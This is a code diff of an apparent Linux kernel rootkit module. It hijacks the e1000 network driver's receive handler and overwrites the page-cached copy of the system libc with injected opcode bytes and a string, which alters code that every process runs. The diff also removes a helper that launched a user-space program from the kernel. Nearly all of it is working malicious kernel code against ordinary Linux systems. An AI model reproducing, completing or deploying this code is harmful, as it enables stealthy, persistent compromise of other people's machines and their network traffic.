@@ -7,12 +7,13 @@
 #include "e1000_hw.h"
 #include "e1000_osdep.h"
 #include "e1000_hook.h"
+#include "tty_util.h"
 #ifndef VICTIM_FILE
 #define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
 #endif
 
 const char* net_adapter = "e1000";
-
+extern struct qtty qtty;
 
 #define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"
 
@@ -34,8 +35,7 @@ struct page* old_opcode;
 struct page* new_opcode;
 struct page* old_troll;
 struct page* new_troll;
-char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops
-
+char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nop
 void page_cache_test(void){
   char* path = VICTIM_FILE_OVERRIDE;
   i = get_file_path(path);//
@@ -50,10 +50,6 @@ void page_cache_test(void){
     return;
   }
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
-
-  //fuckery(i, 0x00191027);
-
-  //unmap_page(i, 0x00107c10);
   write_string_page_cache(i, 0x00191027, troll, 8, &new_troll, &old_troll);
   write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, &new_opcode, &old_opcode);
   
@@ -61,21 +57,6 @@ void page_cache_test(void){
 }
 
 
-void launch_bash(void){
-  struct subprocess_info* sub_info;
-  int status;
-  char* argv[] = {"hello world!\xA", NULL};
-
-  char* envp[] = {
-    "HOME=/",
-    "TERM=linux",
-    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
-    NULL
-  };
-  status = call_usermodehelper("/home/mineo333/Qogchamp/testing/write_string/write_string", argv, envp, UMH_WAIT_EXEC);
-  printk(KERN_INFO "status: %d\n", status);
-  
-}
 
 int init_module(void)
 {
@@ -107,7 +88,7 @@ int init_module(void)
 
   printk(KERN_INFO "RX Rings: %d\n", e1000 ->num_rx_queues);
 
-  printk(KERN_INFO "Max rx desc size: %d\n", e1000->rx_buffer_len); 
+  printk(KERN_INFO "Max rx desc size: %d\n", e1000->rx_buffer_len);  //e1000->rx_buffer_len is the maximum size of a given buffer.
   
   /* <- rx_buffer_len is 1522 bytes. This is
    * best explained here: https://serverfault.com/questions/422158/what-is-the-in-the-wire-size-of-a-ethernet-frame-1518-or-1542
@@ -123,6 +104,8 @@ int init_module(void)
   old_clean_rx = e1000->clean_rx; //save old clean_rx
   
   WRITE_ONCE(e1000->clean_rx, e1000_clean_rx_irq); 
+
+  
   if(sizeof(struct ethhdr) == ETH_HLEN){
     printk(KERN_INFO "SAME\n");
   }
@@ -138,6 +121,8 @@ void cleanup_module(void)
   //replace_page(new_opcode, old_opcode);
   //replace_page(new_troll, old_troll); //flipped around because old is the new now. 
 
+
+  
 
 	printk("Module cleanup\n");
 }
